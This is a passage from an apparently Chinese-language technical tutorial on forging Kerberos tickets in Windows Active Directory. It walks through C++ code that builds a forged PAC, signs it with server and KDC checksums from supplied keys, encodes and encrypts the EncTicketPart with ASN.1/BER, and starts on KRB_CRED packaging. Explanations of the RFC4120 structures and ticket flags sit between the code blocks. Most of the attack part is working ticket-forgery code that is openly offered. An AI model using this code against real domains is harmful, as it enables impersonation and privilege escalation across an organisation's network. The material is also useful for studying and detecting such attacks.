typedef struct _PAC_SIGNATURE_DATA {
    ULONG SignatureType;
    UCHAR Signature[ANYSIZE_ARRAY];
} PAC_SIGNATURE_DATA, *PPAC_SIGNATURE_DATA;
```

这些结构被放置在顶级 PACTYPE 结构的 Buffers 数组之后，放置的偏移量由每个对应的 PAC\_INFO\_BUFFER 结构在Buffers数组中的 Offset 字段指定。与服务器签名对应的 PAC\_INFO\_BUFFER 的 ulType 字段包含值 0x00000006，而与 KDC 签名对应的 PAC\_INFO\_BUFFER 的 ulType 字段包含值 0x00000007。

服务器签名是整个 PAC 消息的密钥哈希，由 KDC 生成 ，并取决于 KDC 和服务器可用的加密算法。KDC 将使用 KDC 与服务器共享的 Long-term Key，以便服务器可以在收到 PAC 时验证此签名。

KDC 签名是 PAC 消息中服务器签名字段的密钥哈希，由 KDC 生成，并取决于 KDC 可用的加密算法。KDC 将使用 KDC 账户 Krbtgt 密钥，以便其他 KDC 在接收 PAC 时可以验证此签名。

### Generate PAC Type

了解上述知识后，我们开始伪造 PAC 结构，该过程被写在了 `ValidationInfoToPAC()` 函数中，如下所示。

```c++
BOOL ValidationInfoToPAC(PKERB_VALIDATION_INFO pValidationInfo, LONG SignatureType, PPACTYPE* pacType, DWORD* pacTypeSize)
{
    BOOL status = FALSE;
    PVOID pLogonInfo = NULL, pClaims = NULL;
    PPAC_CLIENT_INFO pClientInfo = NULL;
    PAC_SIGNATURE_DATA signatureData = { SignatureType, {0} };
    DWORD n = 4, szLogonInfo = 0, szLogonInfoAligned = 0, szClientInfo = 0, szClientInfoAligned, szSignature = FIELD_OFFSET(PAC_SIGNATURE_DATA, Signature), szSignatureAligned, offsetData = sizeof(PACTYPE) + 3 * sizeof(PAC_INFO_BUFFER);
    PKERB_CHECKSUM pCheckSum;

    // Get the implementation system of the specified verification algorithm.
    if (NT_SUCCESS(CDLocateCheckSum(SignatureType, &pCheckSum)))    
    {
        szSignature += pCheckSum->CheckSumSize;    // szSignature = 4 + pCheckSum->CheckSumSize
        // Align szSignature to 8 or its multiple.
        szSignatureAligned = SIZE_ALIGN(szSignature, 8);

        // Encrypt KERB_VALIDATION_INFO type data.
        if (EncodeValidationInformation(&pValidationInfo, &pLogonInfo, &szLogonInfo))
            // Align szLogonInfo to 8 or its multiple.
            szLogonInfoAligned = SIZE_ALIGN(szLogonInfo, 8);

        // Enter the GeneratePacClientInfo function to generate a PAC_CLIENT_INFO 
        // type buffer for PAC.
        if (GeneratePacClientInfo(&pValidationInfo->LogonTime, pValidationInfo->EffectiveName.Buffer, &pClientInfo, &szClientInfo))
            szClientInfoAligned = SIZE_ALIGN(szClientInfo, 8);

        if (pLogonInfo && pClientInfo)
        {
            *pacTypeSize = sizeof(PACTYPE) + 3 * sizeof(PAC_INFO_BUFFER) + szLogonInfoAligned + szClientInfoAligned + szSignatureAligned * 2;
            if (*pacType = (PPACTYPE)LocalAlloc(LPTR, *pacTypeSize))
            {
                (*pacType)->cBuffers = 4;
                (*pacType)->Version = 0;

                (*pacType)->Buffers[0].cbBufferSize = szLogonInfo;
                (*pacType)->Buffers[0].ulType = PACINFO_TYPE_LOGON_INFO;
                (*pacType)->Buffers[0].Offset = sizeof(PACTYPE) + 3 * sizeof(PAC_INFO_BUFFER);
                RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[0].Offset, pLogonInfo, szLogonInfo);

                (*pacType)->Buffers[1].cbBufferSize = szClientInfo;
                (*pacType)->Buffers[1].ulType = PACINFO_TYPE_CNAME_TINFO;
                (*pacType)->Buffers[1].Offset = (*pacType)->Buffers[0].Offset + szLogonInfoAligned;
                RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[1].Offset, pClientInfo, szClientInfo);

                (*pacType)->Buffers[2].cbBufferSize = szSignature;
                (*pacType)->Buffers[2].ulType = PACINFO_TYPE_CHECKSUM_SRV;
                (*pacType)->Buffers[2].Offset = (*pacType)->Buffers[1].Offset + szClientInfoAligned;
                RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[2].Offset, &signatureData, szSignature);

                (*pacType)->Buffers[3].cbBufferSize = szSignature;
                (*pacType)->Buffers[3].ulType = PACINFO_TYPE_CHECKSUM_KDC;
                (*pacType)->Buffers[3].Offset = (*pacType)->Buffers[2].Offset + szSignatureAligned;
                RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[3].Offset, &signatureData, szSignature);

                status = TRUE;
            }

            if (pLogonInfo)
                LocalFree(pLogonInfo);
            if (pClientInfo)
                LocalFree(pClientInfo);
        }
    }
    return status;
}
```

这里定义了一个 `PPACTYPE` 结构的 `pacType` 变量，用于保存整个 PAC 结构，其大小为 `sizeof(PACTYPE) + 3 * sizeof() + szLogonInfoAligned + szClientInfoAligned + szSignatureAligned * 2`，以保证可以放得下 1 个 `KERB_VALIDATION_INFO` 缓冲区、1 个 `PAC_CLIENT_INFO` 缓冲区和 2 个 `PAC_SIGNATURE_DATA` 缓冲区。每个缓冲区的地址是连续的，并且从 `PACTYPE` 结构的开头到缓冲区开头的偏移量都是 8 的倍数，因此需要通过 `SIZE_ALIGN` 宏将各个缓冲区的大小向 8 对齐。

### Sign PAC Type

至此，PAC 结构基本生成，但是 2 个 `PAC_SIGNATURE_DATA` 缓冲区部分的数据还没有存入校验和，因此还需要一个生成签名数据的过程，该过程被写在了 `GeneratePacSignatureData()` 函数中，如下所示。

```c++
BOOL GeneratePacSignatureData(PPACTYPE pacType, DWORD pacTypeSize, LONG SignatureType, LPCVOID Key, DWORD dwKeySize)
{
    BOOL status = FALSE;
    PKERB_CHECKSUM pCheckSum;
    PVOID pContext;
    PPAC_SIGNATURE_DATA pSignatureData;
    PBYTE checkSumSrv = NULL, checkSumpKdc = NULL;

    status = NT_SUCCESS(CDLocateCheckSum(SignatureType, &pCheckSum));
    if (status)
    {
        // Then traverse the Buffers buffer in pacType.
        for (ULONG i = 0; i < pacType->cBuffers; i++)
        {
            // Find Buffers with ulType values of PACINFO_TYPE_CHECKSUM_SRV (0x00000006) and
            // PACINFO_TYPE_CHECKSUM_KDC (0x00000007), which are the buffers for saving the 
            // server signature and KDC signature.
            if (pacType->Buffers[i].ulType == PACINFO_TYPE_CHECKSUM_SRV || pacType->Buffers[i].ulType == PACINFO_TYPE_CHECKSUM_KDC)
            {
                pSignatureData = (PPAC_SIGNATURE_DATA)((PBYTE)pacType + pacType->Buffers[i].Offset);
                RtlZeroMemory(pSignatureData->Signature, pCheckSum->CheckSumSize);
                if (pacType->Buffers[i].ulType == PACINFO_TYPE_CHECKSUM_SRV)
                    checkSumSrv = pSignatureData->Signature;
                else if (pacType->Buffers[i].ulType == PACINFO_TYPE_CHECKSUM_KDC)
                    checkSumpKdc = pSignatureData->Signature;
            }
        }
        if (checkSumSrv && checkSumpKdc)
        {
            if (NT_SUCCESS(pCheckSum->InitializeEx(Key, dwKeySize, KERB_NON_KERB_CKSUM_SALT, &pContext)))
            {
                // Calculate the hash of the entire PAC structure。
                pCheckSum->Sum(pContext, pacTypeSize, pacType);
                pCheckSum->Finalize(pContext, checkSumSrv);
                pCheckSum->Finish(&pContext);

                if (pCheckSum->InitializeEx(Key, dwKeySize, KERB_NON_KERB_CKSUM_SALT, &pContext))
                {
                    // Computes the server signature field in the PAC structure。
                    pCheckSum->Sum(pContext, pCheckSum->CheckSumSize, checkSumSrv);
                    pCheckSum->Finalize(pContext, checkSumpKdc);
                    pCheckSum->Finish(&pContext);
                }
            }
        }
    }
    return status;
}
```

该函数首先通过 `CDLocateCheckSum()` 函数找到 `SignatureType` 参数指定的加密加密类型的加密系统，并存储在 `pCheckSum` 结构体中。然后遍历 `pacType` 中的 `Buffers` 缓冲区，找到 `ulType` 值为 `PACINFO_TYPE_CHECKSUM_SRV`（0x00000006）和 PACINFO\_TYPE\_CHECKSUM\_KDC （0x00000007）的 `Buffers` 即为保存服务器签名和 KDC 签名的缓冲区。

然后分别计算整个 PAC 结构的哈希和 PAC 结构中服务器签名字段的哈希，并保存在相应的 `Buffers` 缓冲区中，如下所示。

```c++
if (NT_SUCCESS(pCheckSum->InitializeEx(Key, dwKeySize, KERB_NON_KERB_CKSUM_SALT, &pContext)))
{
    pCheckSum->Sum(pContext, pacTypeSize, pacType);
    pCheckSum->Finalize(pContext, checkSumSrv);
    pCheckSum->Finish(&pContext);

    if (pCheckSum->InitializeEx(Key, dwKeySize, KERB_NON_KERB_CKSUM_SALT, &pContext))
    {
        pCheckSum->Sum(pContext, pCheckSum->CheckSumSize, checkSumSrv);
        pCheckSum->Finalize(pContext, checkSumpKdc);
        pCheckSum->Finish(&pContext);
    }
}
```

Generate and Encrypt EncTicketPart
----------------------------------

至此，已经制作好了整个 PAC 结构，接下来需要将 PAC 嵌入票据的 EncTicketPart 部分。这里，我们还需要补充一些知识。

### Message Specifications in RFC4120

Kerberos 协议在其文档 “[*\[RFC4120\] The Kerberos Network Authentication Service (V5)*](https://www.ietf.org/rfc/rfc4120.txt)” 中以抽象语法标记（Abstract Syntax Notation One，ASN.1）的形式进行定义，ASN.1 提供了一种语法来指定协议消息的抽象布局及其编码方式。Kerberos 协议消息的编码应遵守 \[X690\] 中描述的 ASN.1 的可分辨编码规则（DER，ASN.1 对象的编码是 ASN.1 标准的重要部分，通常采用的是 BER，而 DER 则是 BER 的一个子集）。

Kerberos 协议中的类型应采用以下形式的 ASN.1 模块定义：

```cpp
KerberosV5Spec2 {
        iso(1) identified-organization(3) dod(6) internet(1)
        security(5) kerberosV5(2) modules(4) krb5spec2(2)
} DEFINITIONS EXPLICIT TAGS ::= BEGIN

-- rest of definitions here

END
```

### Tickets Specifications

Kerberos 协议中的 Tickets 类型应采用以下形式的 ASN.1 模块定义：

```cpp
Ticket          ::= [APPLICATION 1] SEQUENCE {
        tkt-vno         [0] INTEGER (5),
        realm           [1] Realm,
        sname           [2] PrincipalName,
        enc-part        [3] EncryptedData -- EncTicketPart
}

-- Encrypted part of ticket

EncTicketPart   ::= [APPLICATION 3] SEQUENCE {
        flags                   [0] TicketFlags,
        key                     [1] EncryptionKey,
        crealm                  [2] Realm,
        cname                   [3] PrincipalName,
        transited               [4] TransitedEncoding,
        authtime                [5] KerberosTime,
        starttime               [6] KerberosTime OPTIONAL,
        endtime                 [7] KerberosTime,
        renew-till              [8] KerberosTime OPTIONAL,
        caddr                   [9] HostAddresses OPTIONAL,
        authorization-data      [10] AuthorizationData OPTIONAL
}

-- encoded Transited field
TransitedEncoding       ::= SEQUENCE {
        tr-type         [0] Int32 -- must be registered --,
        contents        [1] OCTET STRING
}

TicketFlags     ::= KerberosFlags
        -- reserved(0),
        -- forwardable(1),
        -- forwarded(2),
        -- proxiable(3),
        -- proxy(4),
        -- may-postdate(5),
        -- postdated(6),
        -- invalid(7),
        -- renewable(8),
        -- initial(9),
        -- pre-authent(10),
        -- hw-authent(11),
-- the following are new since 1510
        -- transited-policy-checked(12),
        -- ok-as-delegate(13)
```

以下是 Ticket 结构中包含的主要成员：

- tkt-vno：此字段指定票据格式的版本号，目前版本号为 5。
- realm：该字段指定发出票证的领域。它还用于识别服务器主体标识符的领域部分。由于 Kerberos 服务器只能为其领域内的服务器颁发票据，因此两者始终相同。
- sname：该字段指定服务器标识的名称部分的所有组件，包括标识服务的特定实例的那些部分。
- enc-part：该字段保存 EncTicketPart 序列的加密编码。它使用 Kerberos 和终端服务器共享的密钥（服务器的 Secret Key，也就是 Long-term Key，而不是会话密钥）进行加密。

以下是 Ticket 结构的 enc-part 部分中包含的主要成员：

- flags：此字段指示在签发票据时使用或请求了各种选项中的哪些。标志的含义如下：

| Bit(s) | Name | Description |
|---|---|---|
| 0 | reserved | 为将来扩展该字段而保留。 |
| 1 | forwardable | FORWARDABLE 标志通常仅由 TGS 解释，并且可以被终端服务器忽略。 设置后，此标志会告诉票证授予服务器可以根据此票证发出具有不同网络地址的新票据/TGT。 |
| 2 | forwarded | 设置后，此标志表示票据已被转发或根据涉及转发的 TGT 的身份验证颁发。 |
| 3 | proxiable | PROXIABLE 标志通常只由 TGS 解释，可以被终端服务器忽略。 PROXIABLE 标志的解释与 FORWARDABLE 标志的解释相同，除了 PROXIABLE 标志告诉票据授予服务器只有非 TGT 票据可以使用不同的网络地址发布。 |
| 4 | proxy | 设置后，此标志表示票证是一个代理票据。 |
| 5 | may-postdate | MAY-POSTDATE 标志通常只由 TGS 解释，可以被终端服务器忽略。 这个标志告诉票据授予服务器，可以根据这个票据（TGT）签发一个远期的票据。 |
| 6 | postdated | 此标志表示此票证已远期。终端服务可以检查 authtime 字段以查看原始身份验证发生的时间。 |
| 7 | invalid | 此标志表示票证无效，必须在使用前由 KDC 验证。 应用程序服务器必须拒绝设置了此标志的票证。 |
| 8 | renewable | RENEWABLE 标志通常只由 TGS 解释，并且通常可以被终端服务器忽略。可更新票证可用于获得在稍后日期到期的替换票证。 |
| 9 | initial | 此标志表示此票证是使用 AS 协议签发的，而不是基于 TGT 签发的。 |
| 10 | pre-authent | 此标志表示在初始身份验证期间，客户端在签发票据之前由 KDC 进行了预身份验证。 预验证方法的强度未指明，但为 KDC 所接受。 |
| 11 | hw-authent | 此标志表示用于初始身份验证的协议需要使用预期由指定客户端单独拥有的硬件。 硬件验证方法由 KDC 选择，方法的强度未指明。 |
| 12 | transited-policy-checked | 此标志表示领域的 KDC 已根据领域定义的受信任验证者策略检查传输字段。 如果此标志被重置 (0)，则应用服务器必须检查传输的字段本身，如果不能这样做，它必须拒绝身份验证。 如果标志设置为 (1)，则应用服务器可以跳过它自己对传输字段的验证，依赖于 KDC 执行的验证。 根据其选择，应用程序服务器仍然可以根据单独的接受策略应用自己的验证。 |
| 13 | ok-as-delegate | 此标志表示票证中指定的服务器（不是客户端）已由领域策略确定为合适的委托接收者。 客户端可以使用此标志的存在来帮助它决定是否将凭据（授予代理或转发的 TGT）委托给此服务器。 客户端可以随意忽略此标志的值。 设置此标志时，管理员应考虑运行服务的服务器的安全性和位置，以及服务是否需要使用委托凭证。 |
| 14-31 | reserved | 保留以供将来使用。 |

- key：包含会话密钥，该字段存在于票证和 KDC 响应中，用于将会话密钥从 Kerberos 传递到应用程序服务器和客户端。
- crealm：该字段包含客户端注册的领域的名称以及初始身份验证发生的领域。
- cname：该字段包含客户端主体标识符的名称部分。
- transited：此字段列出了参与验证向其签发此票证的用户的 Kerberos 领域的名称。
- authtime：该字段指示指定主体的初始身份验证时间。
- starttime：票证中的此字段指定票证有效的时间。该字段与结束时间一起指定票证的生命周期。 如果 starttime 字段在票中不存在，那么应该使用 authtime 字段来确定票的生命周期。
- endtime：该字段包含票据将过期的时间。请注意，个别服务可以对票证的生命期设置自己的限制，并且可以拒绝尚未过期的票证。因此，这实际上是票证到期时间的上限。
- renew-till：此字段仅存在于在标志字段中设置了 RENEWABLE 标志的票证中。它指示可包含在续订中的最大结束时间。 它可以被认为是票证的绝对到期时间，包括所有续订。
- caddr：票证中的此字段包含零个或多个主机地址。这些是可以使用票证的地址。如果没有地址，则可以在任何地点使用票证。
- authorization-data：授权数据字段用于将授权数据从代表其签发票证的委托人传递到应用程序服务。该字段包含了前文中所描述的 PAC 结构。
    
    该字段包含对在使用票证进行身份验证的基础上获得的任何权限的限制。任何拥有凭据的委托人都可以将条目添加到授权数据字段，因为这些条目进一步限制了可以对票证进行的操作。此类添加可以通过在 TGS 交换期间获得新票证时指定附加条目来进行，或者它们可以在链式委托期间使用身份验证器的授权数据字段添加。
    
    因为凭据持有者可以将条目添加到此字段，除非条目通过封装在 KDC 颁发的元素中单独进行身份验证，否则不允许在票据的授权数据字段中存在条目以放大使用票证可以获得的特权。

Tickets 中的 `authorization-data` 成员类型应采用以下形式的 ASN.1 模块定义：

```cpp
-- NOTE: AuthorizationData is always used as an OPTIONAL field and
-- should not be empty.
AuthorizationData       ::= SEQUENCE OF SEQUENCE {
        ad-type         [0] Int32,
        ad-data         [1] OCTET STRING
}
```

以下是 `authorization-data` 成员中包含的成员：

- ad-data：该字段包含根据相应 ad-type 字段的值进行解释的授权数据。
- ad-type：该字段指定 ad-data 字段的格式。

在下面的定义中，元素的 ad-type 的值和 ad-data 的值如下所示。一般可选的授权元素可以封装在 AD-IF-RELEVANT 元素中。

```cpp
Contents of ad-data                ad-type
DER encoding of AD-IF-RELEVANT        1
DER encoding of AD-KDCIssued          4
DER encoding of AD-AND-OR             5
DER encoding of AD-MANDATORY-FOR-KDC  8
```

### Generate EncTicketPart

我们现在需要做的是，使用 ASN.1 编码规则，构建一个票据 EncTicketPart 部分的数据结构，并将其序列化为一个`PBERVAL`结构体。该过程被写在 `GenerateAppEncTicketPart()` 函数中，如下所示。

{% raw %}

```c++
PBERVAL GenerateAppEncTicketPart(PKERBEROS_TICKET pTicket, LPCVOID pacType, DWORD pacTypeSize)
{
    BerElement* pBer, * pBerPac;
    PBERVAL pBerVal = NULL, pBerValPac = NULL;

    if (pBer = ber_alloc_t(LBER_USE_DER))    // Asn1 ticket
    {
        // Build the APPLICATION 3 tag of EncTicketPart and the 0 tag of the flags member.
        ber_printf(pBer, (PSTR)"t{{t{", MAKE_APP_TAG(ID_APP_ENCTICKETPART), MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_FLAGS));
        // Build the flags member of EncTicketPart.
        ASN1BitStringFromULONG(pBer, pTicket->TicketFlags);
        // Build the 1 tag of the key member of EncTicketPart.
        ber_printf(pBer, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_KEY));
        // Build the key member of EncTicketPart.
        GreateSequenceEncryptionKey(pBer, pTicket->KeyType, pTicket->Key.Value, pTicket->Key.Length);
        // Build the 2 tag of the crealm member of EncTicketPart.
        ber_printf(pBer, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_CREALM));
        // Build the crealm member of EncTicketPart.
        ASN1GeneralStringFromUnicodeString(pBer, &pTicket->AltTargetDomainName);
        // Build the 3 tag of the cname member of EncTicketPart.
        ber_printf(pBer, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_CNAME));
        // Build the cname member of EncTicketPart.
        CreateSequencePrincipalName(pBer, pTicket->ClientName);
        // Build the transited member and its 4 tags, the authtime member 
        // and its 5 tags in EncTicketPart.
        ber_printf(pBer, (PSTR)"}t{{t{i}t{o}}}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_TRANSITED), MAKE_CTX_TAG(ID_CTX_TRANSITEDENCODING_TR_TYPE), 0, MAKE_CTX_TAG(ID_CTX_TRANSITEDENCODING_CONTENTS), NULL, 0, MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_AUTHTIME));
        ASN1GeneralizedTimeFromFileTime(pBer, &pTicket->StartTime);
        // Build the 6 tag of the starttime member of EncTicketPart.
        ber_printf(pBer, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_STARTTIME));
        // Build the starttime member of EncTicketPart.
        ASN1GeneralizedTimeFromFileTime(pBer, &pTicket->StartTime);
        // Build the 7 tag of the endtime member of EncTicketPart.
        ber_printf(pBer, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_ENDTIME));
        // Build the endtime member of EncTicketPart.
        ASN1GeneralizedTimeFromFileTime(pBer, &pTicket->EndTime);
        // Build the 8 tag of the renew-till member of EncTicketPart.
        ber_printf(pBer, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_RENEW_TILL));
        // Build the renew-till member of EncTicketPart.
        ASN1GeneralizedTimeFromFileTime(pBer, &pTicket->RenewUntil);
        ber_printf(pBer, (PSTR)"}");
        // Build the 10 tag of the authorization-data member in the EncTicketPart
        // and the 0 tag of the ad-type member and the 1 tag of the ad-data member in
        // the authorization-data structure.
        ber_printf(pBer, (PSTR)"t{{{t{i}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_AUTHORIZATION_DATA), MAKE_CTX_TAG(ID_CTX_AUTHORIZATIONDATA_AD_TYPE), ID_AUTHDATA_AD_IF_RELEVANT, MAKE_CTX_TAG(ID_CTX_AUTHORIZATIONDATA_AD_DATA));

        if (pBerPac = ber_alloc_t(LBER_USE_DER))    // Asn1 pac
        { 
            ber_printf(pBerPac, (PSTR)"{{t{i}t{o}}}", MAKE_CTX_TAG(ID_CTX_AUTHORIZATIONDATA_AD_TYPE), ID_AUTHDATA_AD_WIN2K_PAC, MAKE_CTX_TAG(ID_CTX_AUTHORIZATIONDATA_AD_DATA), pacType, pacTypeSize);
            if (ber_flatten(pBerPac, &pBerValPac) >= 0)
                ber_printf(pBer, (PSTR)"o", pBerValPac->bv_val, pBerValPac->bv_len);
            ber_free(pBerPac, 1);
            ber_printf(pBer, (PSTR)"}}}}");
        }
        ber_printf(pBer, (PSTR)"}}");
        ber_flatten(pBer, &pBerVal);
        ber_bvfree(pBerValPac);
        ber_free(pBer, 1);
    }
    return pBerVal;
}
```

{% endraw %}

函数中声明了 BerElement 类型的指针变量 `pBer` 和 `pBerPac`，这些变量用于构建 ASN.1 编码的数据。

函数首先通过调用 `ber_alloc_t()` 函数来分配一个用于 BER 编码的 BerElement 结构体，它是一个 C++ 类对象，执行 BER 编码的基本编码规则。然后，使用 `ber_printf()` 函数按照特定的 ASN.1 格式，逐步构建票据 EncTicketPart 部分的各个内容。具体地，就是将 EncTicketPart 的各个字段按照 ASN.1 的规范进行编码，包括票据标志、加密密钥、客户端域名、客户端名称、转发信息、授权时间、起始时间、结束时间和更新截止时间等，如下所示。

{% raw %}

```c++
ber_printf(pBer, (PSTR)"t{{t{", MAKE_APP_TAG(ID_APP_ENCTICKETPART), MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_FLAGS));
ASN1BitStringFromULONG(pBer, pTicket->TicketFlags);
ber_printf(pBer, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_KEY));
GreateSequenceEncryptionKey(pBer, pTicket->KeyType, pTicket->Key.Value, pTicket->Key.Length);
ber_printf(pBer, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_CREALM));
ASN1GeneralStringFromUnicodeString(pBer, &pTicket->AltTargetDomainName);
ber_printf(pBer, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_CNAME));
CreateSequencePrincipalName(pBer, pTicket->ClientName);
ber_printf(pBer, (PSTR)"}t{{t{i}t{o}}}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_TRANSITED), MAKE_CTX_TAG(ID_CTX_TRANSITEDENCODING_TR_TYPE), 0, MAKE_CTX_TAG(ID_CTX_TRANSITEDENCODING_CONTENTS), NULL, 0, MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_AUTHTIME));
ASN1GeneralizedTimeFromFileTime(pBer, &pTicket->StartTime);
ber_printf(pBer, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_STARTTIME));
ASN1GeneralizedTimeFromFileTime(pBer, &pTicket->StartTime);
ber_printf(pBer, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_ENDTIME));
ASN1GeneralizedTimeFromFileTime(pBer, &pTicket->EndTime);
ber_printf(pBer, (PSTR)"}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_RENEW_TILL));
ASN1GeneralizedTimeFromFileTime(pBer, &pTicket->RenewUntil);
ber_printf(pBer, (PSTR)"}");
ber_printf(pBer, (PSTR)"t{{{t{i}t{", MAKE_CTX_TAG(ID_CTX_ENCTICKETPART_AUTHORIZATION_DATA), MAKE_CTX_TAG(ID_CTX_AUTHORIZATIONDATA_AD_TYPE), ID_AUTHDATA_AD_IF_RELEVANT, MAKE_CTX_TAG(ID_CTX_AUTHORIZATIONDATA_AD_DATA));
```

{% endraw %}

`ber_printf()` 函数用于对 BER 元素进行编码，类似于 `sprintf_s()`，该函数的语法如下。 一个重要区别是，状态数据存储在 BerElement 参数中，以便可以多次调用 `ber_printf()` 追加到 BER 元素的末尾。

```c++
WINBERAPI INT BERAPI ber_printf(
  [in, out] BerElement *pBerElement,
  [in]      PSTR       fmt,
            ...        
);
```

接下来，函数采用相同的规则，将之前生成好的 PAC 结构数据通过 `ber_printf()` 函数编码到 `pBerPac` 变量，然后使用 `ber_flatten()` 函数从 `pBerPac` 变量中获取数据来创建一个新的 `berval` 结构，该结构表示根据 BER 编码规则编码的任意二进制数据到 `pBerValPac` 变量中，这些数据就是 PAC 结构经过 BER 编码后的二进制数据。然后会再次使用 `ber_printf()` 函数将 `pBerValPac` 变量中的数据追加到 `pBer` 中，如下所示。

{% raw %}

```c++
if (pBerPac = ber_alloc_t(LBER_USE_DER))    // Asn1 pac
{
    ber_printf(pBerPac, (PSTR)"{{t{i}t{o}}}", MAKE_CTX_TAG(ID_CTX_AUTHORIZATIONDATA_AD_TYPE), ID_AUTHDATA_AD_WIN2K_PAC, MAKE_CTX_TAG(ID_CTX_AUTHORIZATIONDATA_AD_DATA), pacType, pacTypeSize);
    if (ber_flatten(pBerPac, &pBerValPac) >= 0)
        ber_printf(pBer, (PSTR)"o", pBerValPac->bv_val, pBerValPac->bv_len);
    ber_free(pBerPac, 1);
    ber_printf(pBer, (PSTR)"}}}}");
}
```

{% endraw %}

最终，再次调用 `ber_flatten()` 函数，从 `pBer` 变量中获取数据来创建一个新的 `berval` 结构到 `pBerVal` 变量中，这些数据就是最终构建好的 EncTicketPart 部分，但是还未经过加密。

### Encrypt EncTicketPart

至此，我们已经构建好了票据的 EncTicketPart 部分，接下来需要对 EncTicketPart 部分的数据进行加密，加密过程被写在了 `KerberosEncrypt()` 函数中，如下所示。

```c++
BOOL KerberosEncrypt(ULONG dwKeyType, ULONG keyUsage, LPCVOID Key, DWORD dwKeySize, LPCVOID data, DWORD dataSize, LPVOID* output, DWORD* outputSize, BOOL isEncrypt)
{
    BOOL status = FALSE;
    PKERB_ECRYPT pCSystem;
    PVOID pContext;
    DWORD modulo;

    status = NT_SUCCESS(CDLocateCSystem(dwKeyType, &pCSystem));
    if (status)
    {
        if (NT_SUCCESS(pCSystem->Initialize(Key, dwKeySize, keyUsage, &pContext)))
        {
            *outputSize = dataSize;
            if (isEncrypt)
            {
                if (modulo = *outputSize % pCSystem->BlockSize)
                    *outputSize += pCSystem->BlockSize - modulo;
                *outputSize += pCSystem->HeaderSize;
            }
            if (*output = LocalAlloc(LPTR, *outputSize))
            {
                status = isEncrypt ? NT_SUCCESS(pCSystem->Encrypt(pContext, data, dataSize, *output, outputSize)) : NT_SUCCESS(pCSystem->Decrypt(pContext, data, dataSize, *output, outputSize));
            }
            pCSystem->Finish(&pContext);
        }
    }
    return status;
}
```

参考前文中的对 PAC 结构签名的 `GeneratePacSignatureData()`，这段代码的逻辑已经不难理解了。

加密后的 EncTicketPart 部分会临时保存在 `KERBEROS_TICKET` 结构的 `EncTicketPart.Value` 成员中。

至此，我们已经生成并加密了票据的 `EncTicketPart` 部分，但是想要直接使用票据是不行的，我们需要将其封装到 KRB\_CRED 结构中才能提交到内存中。

Generate KRB\_CRED
------------------

KRB\_CRED 结构是将 Kerberos 凭据从一个主体发送到另一个主体的消息格式。他的提出是为了鼓励应用程序在转发票证或向从属服务器提供代理时使用通用机制。它假定会话密钥已经交换，可能是通过使用 KRB\_AP\_REQ/KRB\_AP\_REP 消息。

KRB\_CRED 消息包含一系列要发送的票证和使用票证所需的信息，包括每个票证的会话密钥。使用票据所需的信息通过先前与 KRB\_CRED 消息一起交换或传输的加密密钥进行加密。

Kerberos 协议中的 KRB\_CRED 结构应采用以下形式的 ASN.1 模块定义：

```cpp
KRB-CRED        ::= [APPLICATION 22] SEQUENCE {
        pvno            [0] INTEGER (5),
        msg-type        [1] INTEGER (22),
        tickets         [2] SEQUENCE OF Ticket,
        enc-part        [3] EncryptedData -- EncKrbCredPart
}

EncKrbCredPart  ::= [APPLICATION 29] SEQUENCE {
        ticket-info     [0] SEQUENCE OF KrbCredInfo,
        nonce           [1] UInt32 OPTIONAL,
        timestamp       [2] KerberosTime OPTIONAL,
        usec            [3] Microseconds OPTIONAL,
        s-address       [4] HostAddress OPTIONAL,
        r-address       [5] HostAddress OPTIONAL
}

KrbCredInfo     ::= SEQUENCE {
        key             [0] EncryptionKey,
        prealm          [1] Realm OPTIONAL,
        pname           [2] PrincipalName OPTIONAL,
        flags           [3] TicketFlags OPTIONAL,
        authtime        [4] KerberosTime OPTIONAL,
        starttime       [5] KerberosTime OPTIONAL,
        endtime         [6] KerberosTime OPTIONAL,
        renew-till      [7] KerberosTime OPTIONAL,
        srealm          [8] Realm OPTIONAL,
        sname           [9] PrincipalName OPTIONAL,
        caddr           [10] HostAddresses OPTIONAL
}
```

以下是 KRB-CRED 结构中包含的主要成员：

- pvno and msg-type：这些字段在前文中进行了描述。msg-type 是 KRB\_CRED。
- tickets：这些是从 KDC 获得的票据，专门供预期接收者使用。连续的票证与来自 KRB-CRED 消息的 enc 部分的相应 KrbCredInfo 序列配对。
- enc-part：该字段包含在发送方和预期接收方共享的会话密钥下加密的 EncKrbCredPart 序列的编码，密钥使用值为 14。此加密编码用于 KRB-CRED 消息的 enc-part 字段。
- nonce：如果可行，应用程序可能需要包含消息接收者生成的随机数。如果消息中包含与 nonce 相同的值，则表明该消息是最新的并且没有被攻击者重播。
- timestamp and usec：这些字段指定生成 KRB-CRED 消息的时间。该时间用于确保消息是最新的。
- s-address and r-address：这些字段在前文中进行了描述。
- key：该字段存在于 KRB-CRED 消息封装并传递的相应票据中，用于将会话密钥从发送者传递给预期的接收者。

